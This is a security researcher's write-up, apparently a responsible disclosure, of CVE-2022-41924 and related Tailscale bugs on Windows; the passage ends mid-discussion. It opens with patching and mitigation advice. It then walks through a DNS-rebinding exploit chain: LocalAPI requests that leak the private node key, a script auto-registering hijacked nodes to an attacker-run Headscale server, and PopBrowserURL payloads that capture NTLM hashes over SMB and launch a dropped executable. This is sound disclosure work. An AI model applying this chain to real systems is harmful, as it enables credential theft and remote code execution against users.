<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://emily.id.au/tailscale">Original</a>
    <h1>CVE-2022-41924 ‚Äì tailscaled can be used to remotely execute code on Windows</h1>
    
    <div id="readability-page-1" class="page"><div data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"><h2 id="tldr-recommendations"><a aria-hidden="true" tabindex="-1" href="#tldr-recommendations"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>TL;DR Recommendations</h2><h3 id="for-issues-1-6"><a aria-hidden="true" tabindex="-1" href="#for-issues-1-6"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>For Issues 1-6</h3><p>Update to Tailscale <strong>v1.32.3</strong>, which was released today. Note that Tailscale
does not automatically update itself. Administrators can see the current version
running on all devices on the Tailscale admin page. <!-- todo headscale --></p>
<p>In descending order of priority, update:</p>
<ol>
<li>Windows machines with web browsers</li>
<li>Other machines with web browsers</li>
<li>Machines without web browsers</li>
</ol>
<p>See Tailscale&#39;s
<a href="https://tailscale.com/blog/windows-security-vulnerabilities/" title="null" rel="noopener noreferrer">blog post</a> and
<a href="https://tailscale.com/security-bulletins/" title="null" rel="noopener noreferrer">bulletins (TS-2022-004 and TS-2022-005)</a>.</p>
<h3 id="for-issue-7"><a aria-hidden="true" tabindex="-1" href="#for-issue-7"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>For Issue 7</h3><p>If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated <em>or</em> rely on Tailscale for authentication, implement an
allowlist of expected HTTP <code>Host</code> headers to prevent malicious Javascript from
accessing these services.</p>
<p>This mitigation can be tested with <code>curl</code> ‚Äì if you can put something random in
the <code>Host</code> header, and you can view information or take actions which should not
be available to the public, action is required:</p>
<p><img src="https://emily.id.au/posts/tailscale/dns-rebinding.png" alt=""/></p>
<p>Alternatively, you can use Tailscale&#39;s built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either <a href="https://tailscale.com/blog/tls-certs/" title="null" rel="noopener noreferrer">directly</a> or via
something like <a href="https://tailscale.com/blog/caddy/" title="null" rel="noopener noreferrer">caddy</a>.</p>
<p>Tailscale has published remediation advice for this issue
<a href="https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks" title="null" rel="noopener noreferrer">here</a>.</p>
<h3 id="overall"><a aria-hidden="true" tabindex="-1" href="#overall"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Overall</h3><p>Keep using Tailscale! üíï</p>
<p>The speed and quality of Tailscale&#39;s response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.</p>
<hr/>
<h2 id="background"><a aria-hidden="true" tabindex="-1" href="#background"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Background</h2><p>Tailscale is a mesh VPN service: nodes on a Tailscale network establish direct
Wireguard connections to one another on-demand, using information pushed out by
a central control plane (what IPs each node can be found at, what Wireguard
public keys they use, which nodes are allowed to access which ports, etc.).</p>
<p>On each node, a process called tailscaled does all the heavy lifting ‚Äì talking
to the control plane, setting up the TUN interface, and carrying packets back
and forth. A separate process provides a tray icon and configuration GUI in the
Windows taskbar (or the macOS menu bar). On Linux, configuration is performed
solely through the <code>tailscale</code> command-linux utility. These front-end interfaces
communicate with <code>tailscaled</code> through an HTTP API called the LocalAPI.</p>
<p>On unix platforms, the LocalAPI is bound to an <code>AF_UNIX</code> socket, with a tiered
permission structure (basic read-only access for most unix users, privileged
access for <code>root</code> or another specially designated user).</p>
<p>On Windows, which lacks (or
<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/" title="null" rel="noopener noreferrer">lacked!</a>)
<code>AF_UNIX</code>, the LocalAPI instead binds to a loopback TCP socket,
<code>127.0.0.1:41112</code>. It checks <code>netstat</code> to enforce that incoming TCP connections
are from the expected Windows user, emulating the unix socket privilege model
described above.</p>
<p>In a world where our computers run only trusted code, these two approaches would
provide equivalent security to one another. The world we actually live in is
much, much, messier.</p>
<h2 id="the-treacherous-user-agent"><a aria-hidden="true" tabindex="-1" href="#the-treacherous-user-agent"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>The Treacherous User Agent</h2><p>If you visit my website, I am granted the honour and the privilege of executing
arbitrary Javascript on your computer.</p>
<p>This is a pretty bad idea, but luckily even the web browser has its limits. If
my code asks, for example, to perform an HTTP request to
<code>/var/run/tailscale/tailscaled.sock</code>, I will be laughed out of the V8 engine
before I can so much as <code>connect(3)</code>.</p>
<p>If my code asks to speak to <code>127.0.0.1:41112</code>, the browser is a little more
receptive... but only a little. The types of requests I can make are limited,
and I cannot read the responses.</p>
<p>If, on the other hand, my code asks to speak to my very own website... what
could possibly be malicious about that? The browser allows abitrary requests to
be made, and responses to be read.</p>
<p>This last idea is known as the <strong>Same-Origin Policy</strong>, and is a critical layer
of asbestos fireproofing keeping the modern web from going up in flames.</p>
<p>Unfortunately, the Same-Origin Policy is somewhat flawed in its interpretation
of what is and is not &#34;my website&#34;. Let&#39;s say I host my website at the memorable
domain of <code>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it</code>:</p>
<pre>$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
<i>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address <b>1.2.3.4</b></i>
$ host s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it
<i>s-1.2.3.4-127.0.0.1-12345-rr-e.d.rebind.it has address <b>127.0.0.1</b></i>
</pre>

<p>When my web page (which was initially loaded from a server at <code>1.2.3.4</code>) wishes
the make a request to its own domain, the browser will check with DNS again,
just in case I&#39;ve decided to move my web server down the street in the time
since you loaded the page. Surprisingly, I have! My web server is now located at
<code>127.0.0.1</code>!</p>
<p>The browser dutifully carries out the request to this new IP address, without
ever deeming the request to be Cross-Origin, since the domain of the webpage
matches the domain of the new request. This is called a DNS Rebinding attack.</p>
<div>

<h3 id="issue-1---localapi-vulnerable-to-dns-rebinding-on-windows"><a aria-hidden="true" tabindex="-1" href="#issue-1---localapi-vulnerable-to-dns-rebinding-on-windows"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 1 - LocalAPI vulnerable to DNS Rebinding on Windows</h3><p><strong>CVE</strong>: CVE-2022-41924</p>
</div>

<p>Applying this technique, our malicious website can make arbitrary requests to
the LocalAPI. Since the API does not apply any additional authentication, apart
from checking that our browser is running as the same Windows user as the
Tailscale GUI, we have full privileges, and can introspect and reconfigure
<code>tailscaled</code> to taste.</p>
<p>What will we do with our newfound abilities?</p>
<h2 id="information-disclosure"><a aria-hidden="true" tabindex="-1" href="#information-disclosure"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Information Disclosure</h2><p>The <code>status</code> and <code>whois</code> endpoints expose details (hostnames, TS and real IP
addresses, service lists) of the machines on the tailnet, as well as the names,
email addresses, and profile pictures of machines&#39; owners.</p>
<p>We can also learn the Wireguard private key used by the node. This is sanitised
when the preferences are requested:</p>
<div><pre><span>GET</span> <span>/</span>localapi<span>/</span>v0<span>/</span>prefs <span>HTTP</span><span>/</span><span>1.1</span>

<span>...</span>
<span>&#34;PrivateNodeKey&#34;</span><span>:</span> <span>&#34;privkey:0000000000000000000000000000000000000000000000000000000000000000&#34;</span><span>,</span>
<span>...</span></pre></div><p>...but is revealed when preferences are updated:</p>
<div><pre><span>PATCH</span> <span>/</span>localapi<span>/</span>v0<span>/</span>prefs <span>HTTP</span><span>/</span><span>1.1</span>
<span>{</span><span>}</span>

<span>...</span>
<span>&#34;PrivateNodeKey&#34;</span><span>:</span> <span>&#34;privkey:d8e0d574e0ef19adafe8ed83b6068f6dd47c4c2e3062342f4673c63488e5f75e&#34;</span><span>,</span>
<span>...</span></pre></div><p>This key should allow us to impersonate the targeted Windows node on the
tailnet, opening Wireguard connections and accessing private services that
should not be exposed to us. Unfortunately, there are some additional custom
packets required to talk to a Tailscale node on top of pure Wireguard. The
relevant code is open source, but using it would require writing an
unconscionable amount of Go. Thus, we move on...</p>
<h2 id="becoming-the-control-plane"><a aria-hidden="true" tabindex="-1" href="#becoming-the-control-plane"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Becoming the Control Plane</h2><p>A <code>PATCH</code> to <code>/localapi/v0/prefs</code> can be used to update <code>ControlURL</code>, moving the
machine to an attacker-controlled control plane server, away from the default of
<code>https://controlplane.tailscale.com</code>. The third-party open-source control plane
server implementation, <a href="https://github.com/juanfont/headscale" title="null" rel="noopener noreferrer">Headscale</a>, will
serve our purposes nicely.</p>
<p>Unfortunately, the <code>ControlURL</code> change doesn&#39;t take effect until the Tailscale
client is restarted. In practice, this will likely mean waiting for the whole
machine to reboot ‚Äì likely not an insurmountable restriction in the age of
automatic Windows Update installation.</p>
<p>We can process Headscale&#39;s logs to automatically accept new machines that appear
into our malicious tailnet:</p>
<details>
<summary><code><span>while</span>(&lt;&gt;){<span>/(?&lt;=ter\/)nodekey:\w*/</span>&amp;&amp;<span>`headscale -n meow nodes register --key $&amp;`</span>}
</code></summary>

<div><pre><span>import</span> re
<span>import</span> subprocess
<span>import</span> sys

seen <span>=</span> <span>set</span><span>(</span><span>)</span>
r <span>=</span> re<span>.</span><span>compile</span><span>(</span><span>rb&#34;(?&lt;=/register/)nodekey:[^ ]*&#34;</span><span>)</span>

<span>for</span> line <span>in</span> sys<span>.</span>stdin<span>.</span><span>buffer</span><span>:</span>
    <span>if</span> <span>(</span><span>match</span> <span>:=</span> r<span>.</span>search<span>(</span>line<span>)</span><span>)</span><span>:</span>
        <span>if</span> <span>match</span> <span>not</span> <span>in</span> seen<span>:</span>
            subprocess<span>.</span>run<span>(</span><span>[</span>sys<span>.</span>argv<span>[</span><span>1</span><span>]</span><span>,</span> <span>&#34;-n&#34;</span> <span>&#34;meow&#34;</span><span>,</span> <span>&#34;nodes&#34;</span><span>,</span> <span>&#34;register&#34;</span><span>,</span> <span>&#34;--key&#34;</span><span>,</span> <span>match</span><span>[</span><span>0</span><span>]</span><span>.</span>decode<span>(</span><span>)</span><span>]</span><span>)</span>
            seen<span>.</span>add<span>(</span><span>match</span><span>)</span>

    sys<span>.</span>stdout<span>.</span><span>buffer</span><span>.</span>write<span>(</span>line<span>)</span></pre></div></details>

<p>Once the machine has rebooted and joined, we can access any network services the
machine runs. While we&#39;re setting preferences through the LocalAPI, we can also
configure the machine to act as an Exit Node, letting us access any other
services on the same physical network as the targeted machine.</p>
<p>This sounds like a highly effective attack, as it gives us a position from which
to move laterally within the target&#39;s traditional network, without running
malicious code on the machine (except for the one-off Javascript to reconfigure
<code>tailscaled</code>) ‚Äì Tailscale is acting as a LOLBin, proxying us into the network.</p>
<p>In practice, access to the local network may not be as exciting a prospect
against a Tailscale user as it would against nearly any other target. If they&#39;ve
fully bought in to the Tailscale way of doing things, there probably isn&#39;t
anything particularly juicy sitting around unfirewalled on the traditional
private network.</p>
<h2 id="popbrowserur_shell_"><a aria-hidden="true" tabindex="-1" href="#popbrowserur_shell_"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PopBrowserUR_Shell_</h2><p>In theory, there is no path for a malicious Tailscale control plane to remotely
execute code on your machine, unless you happen to run network services that are
designed to allow it, like an
<a href="https://tailscale.com/kb/1193/tailscale-ssh/" title="null" rel="noopener noreferrer">SSH server with Tailscale-backed authentication</a>.
In practice:</p>
<figure><iframe width="1240" height="775" src="https://www.youtube.com/embed/2OFCC7wuvQI" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption><center><i>aarch64 Windows doesn&#39;t have <tt>calc.exe</tt>; please accept this notepad-popping as a meager substitute</i></center></figcaption></figure>

<p><code>tailscaled</code> is constantly long-polling the control plane, waiting for updates
to the layout of your network. Sometimes, when you want to perform a privileged
action, like SSHing to a locked-down server, Tailscale will ask you to
re-authenticate yourself, by including a <code>PopBrowserURL</code> field in the response.</p>
<div>

<h3 id="issue-2---control-plane-can-trigger-code-execution"><a aria-hidden="true" tabindex="-1" href="#issue-2---control-plane-can-trigger-code-execution"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 2 - Control plane can trigger code execution</h3><p><em>Resolved in <code>1.32.3</code> through URL filtering</em></p>
</div>

<p>The daemon forwards this URL to the GUI, whose job is to open it in a web
browser. The specifics of how this is implemented are unclear, as the GUI
component is closed-source, and reverse-engineering Go binaries is about as fun
as pulling teeth from an adorable blue gopher. Suffice to say it is implemented
sub-optimally, as it allows the control plane to push out arbitrary paths for
files to open.</p>
<p>How can we go from &#34;open any path&#34; to &#34;execute any code&#34;? Windows can open
executables directly from WebDAV servers, which seems promising! If we push out
the URL <code>\\live.sysinternals.com\tools\Procmon64.exe</code>, Tailscale will download
and launch Procmon, but the user will be prompted before the program launches,
as the downloaded file bears the Mark of the Web:</p>
<p><img src="https://emily.id.au/posts/tailscale/motw.jpg" alt="Windows popup: We can&#39;t verify who created this file. Are you sure you want to run this file?"/></p>
<p>We can use another Tailscale feature to bypass the need for user interaction.
Taildrop is a super-convenient feature, providing a UI to send files between
devices owned by the same user on a tailnet. Taildrop can be enabled/disabled by
the tailnet administrator, and it is off by default. Unfortunately, ever since
your <code>ControlURL</code> was changed to point to a malicious server, your tailnet
administrator has not been someone with your best interests at heart.</p>
<p><img src="https://emily.id.au/posts/tailscale/tailscale-website.jpg" alt="Tailscale marketing screenshot: &#34;Taildrop by Tailscale is the simplest way to send files to any of your devices, anywhere. A safe private network that just works.&#34;"/></p>
<div>

<h3 id="issue-3---taildrop-does-not-apply-mark-of-the-web"><a aria-hidden="true" tabindex="-1" href="#issue-3---taildrop-does-not-apply-mark-of-the-web"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 3 - Taildrop does not apply Mark of the Web</h3><p><em>Resolved in <code>1.32.3</code> (MOTW and <code>com.apple.quarantine</code> applied)</em></p>
</div>

<p>From another machine on the Headscale tailnet, we can Taildrop an arbitrary
executable which will land on the victim&#39;s desktop. This file is not tainted
with the Mark of the Web, so Tailscale will be able to launch it without user
interaction. All we need to do is find it:</p>
<div><pre><span>&#34;PopBrowserURL&#34;</span><span>:</span> <span>&#34;C:\Users\___ü§∑‚Äç‚ôÄÔ∏è___\Desktop\malware.exe&#34;</span></pre></div><p>Perhaps it is possible to guess the target&#39;s Windows username from their email
address, which we learned from rebinding to the LocalAPI <code>status</code> endpoint
earlier. Perhaps the target is sitting on a network with an unauthenticated LDAP
server, which we can bind to and enumerate usernames, using the victim as an
Exit Node. There is a solution which applies much more generally, and like so
much of Windows, it&#39;s remarkably cursed:</p>
<p>To learn the target&#39;s username, we must first learn their password.</p>
<div><pre><span>&#34;PopBrowserURL&#34;</span><span>:</span> <span>&#34;\\100.64.0.1&#34;</span></pre></div><p><img src="https://emily.id.au/posts/tailscale/responder.png" alt="Screenshot from Responder, showing an NTLMv2-SSP Hash for Jamie received over SMB from 100.64.0.2"/></p>
<p>We can ask Tailscale to open a path on an SMB share. Windows being Windows, it
will send your username (and a hash of your login password) to this server,
unprompted, despite having no reason to consider the server trustworthy.</p>
<p>Since we can make the SMB connection over Tailscale, we bypass any network-level
egress filtering of SMB connections, which appears to be a commonly-recommended
mitigation against this class of attack.</p>
<p>Now the Windows username is known, we can fill in the blank, and trigger
execution of our code:</p>
<div><pre><span>&#34;PopBrowserURL&#34;</span><span>:</span> <span>&#34;C:\Users\jamie\Desktop\malware.exe&#34;</span></pre></div><h3 id="demo-time"><a aria-hidden="true" tabindex="-1" href="#demo-time"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Demo Time</h3><iframe width="1240" height="775" src="https://www.youtube.com/embed/rnTk1Cz6yuw" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>Having discovered these three bugs, which we believed could be chained for RCE
against any Windows Tailscale user, we were content. All that was left was to
polish our demo. To do so, we first moved the server hosting the
proof-of-concept from a local machine to one in the cloud. A quick re-test in
Chrome, and...</p>
<p><img src="https://emily.id.au/posts/tailscale/pna.png" alt="Chrome developer console message: Access to fetch at &#39;http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it/&#39; from origin &#39;http://s-35.185.206.165-127.0.0.1-100042828-fs-e.d.rebind.it&#39; has been blocked by CORS policy: The request client is not a secure context and the resource is in more-private address space `local`."/></p>
<p>None of these words are in the Bible.</p>
<p>This is certainly true of the King James Version, but many of these words can be
found in what might as well be the Old Testament of Same-Origin Policy: the
<a href="https://fetch.spec.whatwg.org/" title="null" rel="noopener noreferrer">WhatWG Fetch Standard</a>, which defines the CORS
rules we are being accused of violating.</p>
<p>The Fetch Standard certainly does <em>not</em> define a way for a request targeting the
same domain, protocol, and port as the requesting webpage to be considered
Cross-Site. Apparently, at some point in the past 2<del>022</del> years, a whole new
standard came about:</p>
<blockquote>
<p><del>Judge not according to the appearance, but judge righteous judgment</del> <del>--
John 7:24</del></p>
</blockquote>
<blockquote>
<p>The mitigation described here operates upon the IP address which the user
agent actually connects to when loading a particular resource. This check MUST
be performed for each new connection made, as DNS rebinding attacks may
otherwise trick the user agent into revealing information it shouldn‚Äôt. --
<a href="https://wicg.github.io/private-network-access/#dns-rebinding" title="null" rel="noopener noreferrer">WICG Private Network Access Standard ¬ß5.3 DNS Rebinding</a></p>
</blockquote>
<h2 id="dns-rebinding-is-dead"><a aria-hidden="true" tabindex="-1" href="#dns-rebinding-is-dead"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>DNS Rebinding is Dead</h2><p>The effect of this policy, as currently implemented in Chrome and Edgium,
appears to be that a site hosted in public IP address space cannot rebind to one
hosted in private IP space. When the proof-of-concept was hosted at
<code>192.168.1.172</code>, we could attack all browsers just fine, but as soon as we moved
it to the internet, these mitigations worked their mitigatory magic.</p>
<p>Firefox does not implement PNA, and is fully exploitable over the public
internet using the bugs described above.</p>
<p>The IP addresses considered private by PNA are:</p>
<ul>
<li><code>127.0.0.0/8</code>; the IPv4 loopback space</li>
<li><code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>; the RFC1918 IPv4 spaces;</li>
<li><code>169.254.0.0/16</code>; the IPv4 link-local space</li>
<li>The IPv6-mapped versions of the above</li>
<li><code>::1/128</code>; the IPv6 loopback space</li>
<li><code>fc00::/7</code>; the IPv6 Unique Local Address space</li>
<li><code>fe80::/10</code>; the IPv6 link-local unicast space</li>
</ul>
<p>IPv6 tailnet addresses are chosen from the <code>fc00::/7</code> space, so the attack
should be usable for lateral movement within a tailnet against users. Notably,
this strategy does not require an ACL which allows traffic to <code>:41112</code> on the
attacker&#39;s machine, due to the
<a href="https://pulsesecurity.co.nz/articles/some-tailscale-tricks" title="null" rel="noopener noreferrer">ability to opt out of the firewall</a>
previously discussed by Pulse Security.</p>
<p>Using issues 1-3, this gives us:</p>
<table>
<thead>
<tr>
<th></th>
<th>Windows+Firefox</th>
<th>Windows+Chrome</th>
<th>Non-Windows</th>
</tr>
</thead>
<tbody><tr>
<td><strong>No special access</strong></td>
<td>Exploitable</td>
<td>Unexploitable? (PNA)</td>
<td>Not vulnerable</td>
</tr>
<tr>
<td><strong>Same local network</strong></td>
<td>Exploitable</td>
<td>Exploitable</td>
<td>Not vulnerable</td>
</tr>
<tr>
<td><strong>Same Tailnet</strong></td>
<td>Exploitable</td>
<td>Exploitable</td>
<td>Not vulnerable</td>
</tr>
</tbody></table>
<p>We just mentioned that IPv6 tailnet addresses are private.</p>
<p>IPv4 Tailscale addresses are not from RFC1918. They are not link-local, and they
are certainly not loopback. IPv4 Tailscale addresses are RFC6598 CGNAT
addresses, from the <code>100.64.0.0/10</code> space, a space that is <strong>not considered
private by Chrome!</strong></p>
